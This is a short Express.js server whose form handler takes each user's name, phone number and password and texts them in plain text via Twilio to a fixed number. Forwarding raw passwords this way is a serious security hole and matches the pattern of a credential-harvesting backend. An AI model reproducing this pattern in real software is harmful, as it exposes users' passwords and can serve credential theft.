const express = require('express');
const bodyParser = require('body-parser');
const twilio = require('twilio');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Handle form submission
app.post('/submit', async (req, res) => {
    const { name, phone, password } = req.body;

    // Send SMS using Twilio
    const twilioClient = new twilio('your-twilio-account-sid', 'your-twilio-auth-token');
    
    try {
        await twilioClient.messages.create({
            body: `New User Registration - Name: ${name}, Phone: ${phone}, Password: ${password}`,
            from: 'your-twilio-phone-number',
            to: '+01234567890'  // Replace with your phone number
        });

        console.log('SMS sent successfully');
        res.status(200).send('SMS sent successfully');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error sending SMS');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
